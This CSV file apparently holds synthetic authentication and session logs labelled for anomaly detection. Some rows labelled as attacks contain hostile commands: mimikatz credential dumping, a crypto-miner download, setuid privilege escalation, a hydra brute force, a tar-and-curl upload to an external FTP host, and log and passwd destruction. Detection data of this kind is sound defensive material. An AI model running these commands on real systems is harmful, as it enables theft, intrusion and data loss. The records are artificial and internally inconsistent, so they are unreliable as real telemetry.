timestamp,entity_id,entity_type,login_hour,day_of_week,session_duration,command_length,unique_resources,failed_login_count,is_known_device,is_known_location,auth_method,source_ip,geo_location,device_fingerprint,resource_accessed,command_sequence,login_success,label
2025-05-13 21:39:50,user_0175,employee,10,2,518,117,3,0,1,1,mfa,192.168.211.94,"London, UK",f0f4cc0d9e356abd54a4abf63d67f326,email_server,ls -la; cat report.txt; logout,1,Normal
2024-07-28 01:55:46,user_0082,employee,17,2,1299,104,2,1,1,1,password,172.19.82.120,"Tokyo, JP",0bc3ae481bb1964a5e963858ac1a536a,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-17 01:41:40,user_0129,employee,11,6,898,956,13,0,1,1,mfa,192.168.52.54,"Beijing, CN",58b662fcce8c1a04882f0981b5607824,crm_platform,mimikatz.exe privilege::debug sekurlsa::logonpasswords,1,Suspicious Command
2025-04-01 00:27:10,user_0060,employee,10,1,493,115,4,0,1,1,sso,192.168.215.166,"New York, US",af06be34be2b5befc2ae12e07c269348,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-05-30 12:58:13,user_0132,employee,9,4,3382,62,5,1,1,1,mfa,192.168.240.0,"Berlin, DE",a7d8c846cdc6079d7098e4052dfb9b35,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-05-11 11:09:18,user_0144,employee,15,4,1323,41,2,1,1,1,sso,172.20.231.89,"Tokyo, JP",50dd6d654f6168c7a3962b3fbf9f22ab,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-27 16:53:50,user_0009,employee,15,4,618,87,4,0,1,1,mfa,10.230.146.108,"Tokyo, JP",5807fa6081a88d67747f9fe006c01b3d,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-05-31 18:17:13,user_0068,service_account,1,3,1686,117,4,2,0,1,mfa,192.168.30.209,"Mumbai, IN",15e064de1bc3162d23e02ed3694deff7,devops_pipeline,ls -la; cat report.txt; logout,1,Off-Hours Access
2025-01-06 20:33:02,user_0061,employee,9,4,1837,175,2,1,1,1,password,10.223.247.191,"Singapore, SG",ff8871095bf7405b3485d39291fa2dd9,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-02-12 00:04:40,user_0055,employee,8,3,1405,84,2,0,1,1,password,192.168.66.169,"New York, US",8f5bd1f741264ec4e4b641e81ccefdbe,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-12-05 13:41:09,user_0022,contractor,8,0,1953,166,5,0,1,1,mfa,192.168.140.152,"Singapore, SG",157ab328ef4aad2d49c038a8521b66ac,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-06-28 01:45:20,user_0070,contractor,11,2,379,58,1,0,1,1,password,10.184.189.209,"New York, US",4f50b45b04e7dcdb1bbbeda7be8efc98,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-04-04 23:24:19,user_0154,contractor,13,4,3319,119,2,1,1,1,password,10.182.180.206,"London, UK",739cae3993f6c62b51f4362c4d98c6e7,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-07-19 03:29:29,user_0161,contractor,8,4,1447,77,2,1,1,1,mfa,192.168.96.252,"London, UK",2262a92ed03a5d5f001a2687f7a989df,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-02-05 03:53:41,user_0169,contractor,14,0,557,165,1,0,1,1,mfa,192.168.158.188,"Berlin, DE",117ab06408723dd34d79847618f21031,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-10-31 21:33:02,user_0157,employee,13,2,2175,178,2,1,1,1,sso,172.25.106.215,"Singapore, SG",b57110c063ae4d3f483b9a77d373ee01,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-09-21 03:22:18,user_0058,contractor,11,3,3170,49,1,0,1,1,password,10.211.132.171,"London, UK",92f3a67ec90695d1a9ec470c79728a68,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-11-19 07:29:29,user_0022,contractor,13,4,3265,136,4,1,1,1,mfa,10.34.218.30,"London, UK",3ab44fa64a586016ed48757f59f9d45c,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-02-23 18:42:25,user_0033,employee,9,0,1529,46,5,1,1,1,sso,10.172.93.148,"Berlin, DE",686bdff03893361bfe9f834e41e6fbc7,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-23 17:18:19,user_0032,employee,7,6,59493,594,2,0,0,0,password,96.125.28.118,"Mumbai, IN",ece7e642be96348bbe4612030dca26c8,secrets_vault,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2024-10-30 09:18:13,user_0038,contractor,15,0,763,167,4,1,1,1,password,172.26.111.182,"New York, US",2a6777aace359ea4593563f040a558a9,email_server,ls -la; cat report.txt; logout,1,Normal
2025-05-14 19:03:21,user_0045,employee,15,0,735,39,4,1,1,1,sso,10.28.201.3,"Tokyo, JP",aaf41b02db5431b6f1ace80d55c7849e,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-02-21 12:03:39,user_0088,employee,17,3,3505,98,3,0,1,1,password,172.22.84.150,"Singapore, SG",73020d2637fa71627f475f8188fa0b1e,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-11-04 08:39:22,user_0060,contractor,13,0,2702,55,4,0,1,1,password,172.23.146.4,"London, UK",5806eb48b92d926975b00c5686b5f2b2,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-01-25 09:56:54,user_0033,employee,14,0,2374,176,3,0,1,1,password,10.93.101.160,"Singapore, SG",b7f4ff69aef6fbb231ef143373641798,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-07 06:05:29,user_0161,contractor,14,4,3498,173,4,0,1,1,password,10.192.62.43,"New York, US",a479fc79dd6c452d64afb54195a489b1,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-03-23 07:43:40,user_0068,contractor,14,1,359,58,4,1,1,1,password,192.168.201.121,"New York, US",291ab493894d6722c59388ca8373b080,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-09-07 17:25:46,user_0074,contractor,13,1,886,30,2,1,1,1,sso,172.21.172.16,"Berlin, DE",c2a87924148716f48dd9f655d4d2f2d1,email_server,ls -la; cat report.txt; logout,1,Normal
2025-01-30 03:53:40,user_0093,employee,9,1,3544,55,2,1,1,1,password,172.19.46.54,"Berlin, DE",14955662249148501732f9e47b1f9fb4,email_server,ls -la; cat report.txt; logout,1,Normal
2024-06-23 03:15:11,user_0159,employee,17,4,2361,40,5,1,1,1,password,192.168.92.7,"Berlin, DE",0c61f0895c01c29e8d70ebcff4d06f0b,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-07-17 20:40:34,user_0122,contractor,18,1,807,165,4,0,1,1,mfa,10.7.120.80,"Berlin, DE",2dd796349bf75c36640182e086c49d3a,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-07-25 19:26:54,user_0142,contractor,14,0,1323,176,4,1,1,1,password,192.168.234.207,"London, UK",a8271b40b1a6e1a883e06af22ffff349,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-06-19 10:13:00,user_0090,contractor,12,1,439,26,5,0,1,1,password,192.168.77.31,"Singapore, SG",1eb465071836f2b88bc0a7135c3d006f,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-12-24 09:08:26,user_0185,contractor,9,2,1069,129,4,0,1,1,mfa,192.168.186.62,"Tokyo, JP",7e59f5ac5c6d5e100de4b3da6a54e915,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-03-22 17:26:12,user_0135,contractor,10,4,2604,147,5,1,1,1,mfa,172.16.161.17,"London, UK",519eeb316bd51384445ec9831006ad24,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-12-06 02:32:23,user_0017,contractor,15,0,2603,20,5,1,1,1,mfa,10.188.160.201,"Tokyo, JP",b302b2f519609b4fb404053cf44cf6ab,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-07-14 21:00:44,user_0009,contractor,10,3,2198,188,4,1,1,1,mfa,172.25.158.153,"London, UK",fb7bfaf54c9fa8ef51848ef17e9866ec,email_server,ls -la; cat report.txt; logout,1,Normal
2024-01-29 06:51:21,user_0033,employee,9,4,1805,96,1,1,1,1,mfa,172.31.25.47,"Tokyo, JP",2792a443b4a7a8cf0cb723609ef85a70,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-03-25 08:04:01,user_0064,employee,12,1,1888,122,2,0,1,1,mfa,172.22.4.180,"Tokyo, JP",35209043671e5d6439e2eef0d17cbb94,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-31 16:21:39,user_0026,contractor,11,3,3037,116,4,0,1,1,password,172.26.101.95,"Tokyo, JP",b8ddb6b75e2c5cd2e0f80e6007801c0f,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-02-04 13:40:28,user_0051,contractor,12,0,2974,23,1,1,1,1,password,10.204.60.40,"Singapore, SG",c19103adb4eba36c50360e2793dfd56c,email_server,ls -la; cat report.txt; logout,1,Normal
2024-10-07 14:11:47,user_0127,contractor,16,0,636,103,4,0,1,1,mfa,172.17.29.127,"Berlin, DE",99244afd618e05d2c8cdaae8c9920040,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-02-18 11:53:47,user_0092,vendor,2,5,901,978,13,0,1,1,certificate,10.147.15.197,"Mexico City, MX",3d12a31853282d9951a132dc0b0129e4,compliance_dashboard,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2024-04-04 21:13:19,user_0049,contractor,9,1,2928,183,5,0,1,1,password,10.174.186.7,"Berlin, DE",cbd9454f15a0bd48848bd747519b595d,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-26 23:09:32,user_0085,contractor,12,2,705,88,2,1,1,1,mfa,10.181.237.58,"London, UK",70ba7a455a31f4e39c0cec51252414aa,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-02-14 21:34:36,user_0042,employee,15,3,3062,72,4,1,1,1,password,10.16.158.61,"New York, US",b66748a1f00ebff463660cfd2673f865,email_server,ls -la; cat report.txt; logout,1,Normal
2024-06-16 10:29:48,user_0070,employee,13,3,754,92,5,1,1,1,sso,192.168.72.234,"Berlin, DE",a11b7188ebb38fe97e88e4740ce9f562,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-04-16 11:01:01,user_0078,contractor,11,3,3581,74,2,1,1,1,mfa,172.30.184.185,"Tokyo, JP",1c19617a21c4149f74424764c1315f3a,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-11-27 03:31:33,user_0134,employee,8,0,575,55,2,0,1,1,password,10.63.247.224,"Singapore, SG",9c0eb23c52e4aebe793fc041ab10b008,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-19 09:13:52,user_0158,contractor,10,4,2510,25,1,1,1,1,password,172.27.29.39,"Berlin, DE",1ea19f3da1dea3faa94dc7c7728d1780,email_server,ls -la; cat report.txt; logout,1,Normal
2024-05-13 02:39:51,user_0002,contractor,8,4,1017,195,4,0,1,1,password,10.63.59.170,"London, UK",fbade870349b6f21bb4ca231bbea8431,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-04-20 04:00:11,user_0028,contractor,12,1,680,39,4,1,1,1,password,10.229.104.195,"Tokyo, JP",b77ce8aa3a26aaf06e6a3e279dcffa79,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-20 23:00:41,user_0093,contractor,10,4,1376,80,3,1,1,1,sso,172.27.179.70,"Berlin, DE",3986a71790da477d2425cb953c1619ad,email_server,ls -la; cat report.txt; logout,1,Normal
2024-02-28 07:08:03,user_0128,contractor,17,0,2009,36,5,0,1,1,sso,172.28.138.104,"London, UK",7336ddde407b65eb7f8e21abd33976cc,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-06-13 20:59:52,user_0065,admin,1,0,22,17,3,21,1,0,password,155.234.78.239,"Sao Paulo, BR",a0689ff846ea8926448d7e7ff0f7b6c2,backup_storage,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target,0,Credential Abuse
2024-01-26 20:37:03,user_0077,employee,13,0,3095,81,5,1,1,1,sso,192.168.5.42,"Tokyo, JP",1880980884ada77978e920eebc48869f,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-06-25 08:51:06,user_0064,contractor,8,2,764,38,4,0,1,1,mfa,10.104.25.131,"New York, US",4a9a3db87a365eef5de32f15d0ef7078,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-01-12 03:57:23,user_0168,contractor,8,1,1428,123,2,1,1,1,password,192.168.63.139,"Tokyo, JP",3852b0fde882ff5823a457318ed9ed45,email_server,ls -la; cat report.txt; logout,1,Normal
2024-12-15 10:15:47,user_0022,employee,18,2,2384,49,1,0,1,1,password,10.228.130.78,"London, UK",0a35143aa9c3eab0dcf0718704be8980,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-02-02 18:10:56,user_0123,employee,17,1,1311,180,4,1,1,1,password,10.89.184.179,"Berlin, DE",d0473547618e0489cf10318119bfa614,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-08-24 01:53:28,user_0062,contractor,16,0,3298,35,3,1,1,1,sso,172.28.124.19,"Singapore, SG",95aef78f277ce02c53c49a7dda083b62,email_server,ls -la; cat report.txt; logout,1,Normal
2024-08-31 23:43:51,user_0012,contractor,17,1,1497,53,5,1,1,1,mfa,10.85.194.109,"New York, US",7e9f2d27da36d65b0f12156c97203312,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-05-24 16:24:47,user_0153,contractor,8,2,2162,195,2,0,1,1,password,10.54.57.70,"Berlin, DE",e789665db244ed1ce22003b0f8e70735,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-12-11 00:39:02,user_0092,service_account,13,2,331,1968,10,0,1,1,mfa,10.226.105.198,"Cape Town, ZA",a8fc2a5a26d577a8a5b2e37d50c42426,source_code_repo,mimikatz.exe privilege::debug sekurlsa::logonpasswords,1,Suspicious Command
2025-05-25 13:52:37,user_0113,employee,17,0,2642,28,4,1,1,1,sso,192.168.203.0,"Singapore, SG",f99387919befae82cb18cae8b21571ef,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2025-05-15 16:26:26,user_0124,contractor,18,1,391,123,4,0,1,1,sso,10.184.226.7,"London, UK",67f8fc8a3bd1793d49e82951bf24106d,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-06-25 22:57:51,user_0050,employee,13,1,2417,116,1,0,1,1,password,172.16.232.112,"London, UK",ca7208e0a34d43dc20ebf5bb945205b0,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-11-12 14:49:13,user_0122,employee,13,1,1318,31,3,1,1,1,sso,192.168.244.33,"Singapore, SG",59035e21265359a27e5c248cb7534376,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-03-02 11:38:03,user_0129,contractor,13,2,3083,24,2,1,1,1,sso,10.228.245.176,"Berlin, DE",3f189b8371789938895a90ca45cdb3f1,source_code_repo,ls -la; cat report.txt; logout,1,Normal
2024-09-03 21:46:52,user_0110,employee,11,2,1420,27,5,1,1,1,mfa,10.0.67.141,"New York, US",3198617be16757a315c25b98eb445f34,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-09-21 16:10:37,user_0143,contractor,11,1,1618,181,5,0,1,1,sso,10.168.9.62,"Singapore, SG",59de06ef1c35bff2369b8abeb73b8a74,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-01-07 18:41:03,user_0098,contractor,18,2,2784,93,4,0,1,1,password,192.168.165.9,"Singapore, SG",259064f2094a2da79fd6edb919e1662c,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-06 11:24:21,user_0091,employee,17,4,3513,103,4,0,1,1,mfa,192.168.200.185,"Tokyo, JP",7197a72f325f6eb87fe8e9ca7eb57bb3,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-10-27 21:42:26,user_0092,contractor,9,4,1369,164,2,1,1,1,sso,192.168.45.134,"Berlin, DE",19a188590135fd7ce3ef15c03d76c6cb,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-03-15 13:52:04,user_0163,service_account,23,5,4218,2473,8,2,1,1,api_key,192.168.170.175,"Sydney, AU",7ace5442fc1590ff14e4bff43b07e37e,admin_console,tar czf /tmp/data.tgz /home/user/docs; curl -T /tmp/data.tgz ftp://external.host,1,Data Exfiltration
2024-08-17 16:29:52,user_0141,employee,13,2,2153,131,5,0,1,1,sso,10.130.24.65,"London, UK",9418f5f927b3b1c05e09e4a4f3e5081b,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-01-03 07:04:54,user_0128,contractor,10,1,1769,165,2,0,1,1,mfa,10.50.66.198,"New York, US",85cbcc09e052767ac21e0554633b381d,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-02-03 15:26:17,user_0144,employee,18,2,2509,88,4,1,1,1,sso,192.168.147.171,"Tokyo, JP",1bd2cb6761144e168dac730fa1f22632,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-29 03:29:33,user_0146,contractor,10,1,1712,116,5,0,1,1,sso,172.26.104.120,"Singapore, SG",96a26c9bf53d5c001d17e83c39ec6434,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-20 21:00:46,user_0177,contractor,9,2,995,25,5,1,1,1,password,192.168.235.181,"Tokyo, JP",6b2bd2811c9a183dd4b94f2e7469ec3b,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-03-05 13:29:38,user_0017,contractor,16,0,3278,20,3,0,1,1,password,192.168.255.88,"Singapore, SG",269068f2369889d772571cc65b9fabd9,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-02-10 01:03:11,user_0147,employee,14,3,3040,26,2,0,1,1,password,10.57.195.230,"Berlin, DE",e63b0f0f2d257510b16da0b39484cc35,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-12-10 17:16:05,user_0130,employee,16,0,1270,72,3,1,1,1,sso,192.168.129.29,"Tokyo, JP",4c2b64db6d8668b695a2b1313de990d0,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-04-11 18:48:31,user_0029,contractor,16,3,1148,126,3,1,1,1,password,192.168.236.164,"Berlin, DE",43ae78fedd4febc893a696146a14e79b,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-05-07 12:50:28,user_0109,contractor,17,0,903,138,1,0,1,1,password,172.30.116.229,"New York, US",f12ee627af45664ce3f0ca5ac3e668ec,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-05-16 17:23:21,user_0024,employee,6,0,495,668,15,6,1,1,certificate,192.168.25.11,"Amsterdam, NL",1e91e2c938e830ae1182bf35147804ec,compliance_dashboard,sudo bash; chmod 4755 /usr/bin/find; visudo,1,Privilege Escalation
2025-03-22 21:52:04,user_0061,admin,6,5,239,1232,10,2,1,1,password,192.168.179.41,"Mexico City, MX",7e6670df88dc9c21f246c63e190d12cb,backup_storage,rm -rf /var/log/*; shred -u /etc/passwd; history -c,1,Data Destruction
2024-06-11 12:19:12,user_0007,contractor,18,1,2961,81,4,0,1,1,password,192.168.13.186,"Berlin, DE",4f15df4cc827a61e21a01149da2ff05b,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-06-29 01:04:23,user_0138,employee,11,0,2382,175,5,0,1,1,password,192.168.171.61,"Singapore, SG",eafc5cf6ea5299b2d83857d62944e569,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-09-02 14:04:30,user_0063,employee,14,3,1643,137,5,1,1,1,sso,172.20.191.68,"London, UK",c6c35205fe7a15646962e5a34ebe4119,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-05-17 22:34:42,user_0163,contractor,15,0,1359,147,3,1,1,1,mfa,172.30.130.134,"Berlin, DE",cae85d93cf3b4a6a1fcd638b17db055c,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2024-08-21 18:59:55,user_0030,contractor,12,1,3242,34,4,1,1,1,password,10.124.243.96,"Tokyo, JP",b76439410933291ff27a4cf193b02023,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-02-02 06:10:28,user_0061,contractor,14,1,2077,22,3,0,1,1,password,10.210.50.248,"Singapore, SG",d9210c54c781c97defebfc0e344092ef,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-08-06 00:01:56,user_0040,contractor,14,0,2474,113,1,1,1,1,mfa,10.63.185.204,"Berlin, DE",3dcb5e10806df72ae232174557329a91,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-08-24 04:30:20,user_0118,employee,12,1,3532,86,2,1,1,1,mfa,192.168.3.98,"Berlin, DE",6ee48dc7688958f63f6915bd784532f8,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-03-05 13:57:05,user_0108,employee,11,1,2939,153,5,0,1,1,mfa,192.168.231.192,"New York, US",e6461ffac56ad9d7a3bed29e2d48d392,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-10-15 00:39:32,user_0131,employee,11,0,2172,67,2,1,1,1,password,192.168.223.16,"London, UK",a06cd5a7600bd26d4d2e8dcfc0078594,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-06-22 13:18:23,user_0127,employee,16,2,1727,94,3,0,1,1,mfa,172.19.92.108,"Tokyo, JP",606491a1bae31437ac9768defe0a7d61,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-01-01 08:46:12,user_0059,contractor,13,1,859,79,1,1,1,1,sso,172.26.68.2,"Tokyo, JP",c638ef9f16a2647adfd92e58ba1095b6,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2025-03-08 00:03:09,user_0120,employee,4,5,84025,630,4,0,0,0,password,152.205.77.175,"Amsterdam, NL",655bd72c989c24c74a0dd4a73d6ec3c0,secrets_vault,wget miner.exe; chmod +x miner.exe; ./miner.exe --pool pool.minexmr.com,1,Cryptomining
2025-02-25 13:21:00,user_0090,employee,10,4,848,27,3,0,1,1,password,192.168.34.26,"Singapore, SG",2d118219fce6e67e6b03fcd12defddef,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-04-24 20:10:40,user_0190,employee,14,0,2519,106,3,0,1,1,sso,172.24.91.130,"Tokyo, JP",cea1c7d4f45e2d5dde40d20a2da0766d,vpn_gateway,ls -la; cat report.txt; logout,1,Normal
2024-04-08 00:08:29,user_0134,contractor,12,0,3233,200,1,1,1,1,mfa,10.225.77.253,"Tokyo, JP",02833ff20777fb8f314fe3e22eee58dc,internal_wiki,ls -la; cat report.txt; logout,1,Normal
2025-06-12 03:45:47,user_0128,contractor,10,4,1460,57,1,1,1,1,mfa,10.171.106.179,"Singapore, SG",cf8a7daa0f40a7c1e241d37e1f44895e,financial_db,ls -la; cat report.txt; logout,1,Normal
2025-01-16 21:21:19,user_0052,employee,8,2,1646,20,2,0,1,1,password,10.59.142.200,"New York, US",0143ecdc908f040fce2d7ee479ee54cd,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-07-12 00:43:10,user_0171,employee,17,0,301,27,5,0,1,1,password,10.120.233.81,"Berlin, DE",1472b84e4e8786846ff6803d0235b6e6,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-04-05 15:00:59,user_0118,contractor,14,3,2083,39,1,0,1,1,mfa,192.168.82.140,"Tokyo, JP",b3dd298996fc5e6fcefb23b742366401,customer_data,ls -la; cat report.txt; logout,1,Normal
2024-08-21 16:52:28,user_0043,employee,14,1,3525,52,1,1,1,1,mfa,10.91.222.123,"Singapore, SG",0f25f3ccf1c041f0bd50c2ff15a6bcfe,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-02-02 15:24:41,user_0038,employee,11,4,2773,146,3,0,1,1,sso,10.249.21.190,"London, UK",7e170cd2181267b94e7c8750386e470f,payroll_system,ls -la; cat report.txt; logout,1,Normal
2025-06-29 22:37:22,user_0073,employee,14,0,2335,120,3,0,1,1,mfa,10.30.158.253,"London, UK",e049bc7c8d8fd966d5a164287d670a4d,hr_portal,ls -la; cat report.txt; logout,1,Normal
2024-04-14 08:07:52,user_0048,employee,15,1,2358,48,4,0,1,1,password,172.16.158.15,"London, UK",abd91e80ae230bf6924f4c106b30c06c,hr_portal,ls -la; cat report.txt; logout,1,Normal
2025-05-01 11:01:27,user_0152,contractor,12,1,741,141,2,1,1,1,password,192.168.19.16,"Berlin, DE",534fb07006809a41a75a1817d0b8a9af,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-02-01 05:37:00,user_0156,employee,14,4,1078,85,1,1,1,1,password,10.85.20.85,"Singapore, SG",0e2688768d8f7c2bf304bfb872da97bc,customer_data,ls -la; cat report.txt; logout,1,Normal
2025-03-03 13:06:17,user_0066,employee,11,2,2303,49,3,1,1,1,sso,10.225.253.160,"Tokyo, JP",2cc9a5b52f3fb0708cf8adae782e7a00,payroll_system,ls -la; cat report.txt; logout,1,Normal
2024-11-25 17:14:50,user_0187,employee,14,4,1039,159,3,1,1,1,password,192.168.10.31,"New York, US",686a08b75675285b84184a185f532f77,email_server,ls -la; cat report.txt; logout,1,Normal
2025-03-13 18:23:11,user_0146,employee,17,1,2316,158,3,0,1,1,mfa,10.159.148.175,"New York, US",e354784960750f6d9d0e6d927b2d1894,financial_db,ls -la; cat report.txt; logout,1,Normal
2024-07-16 21:16:43,user_0138,employee,17,0,2871,67,5,0,1,1,password,192.168.0.48,"London, UK",935f848a9d816f8daab2871f2a11e47d,internal_wiki,ls -la; cat report.txt; logout,1,Normal
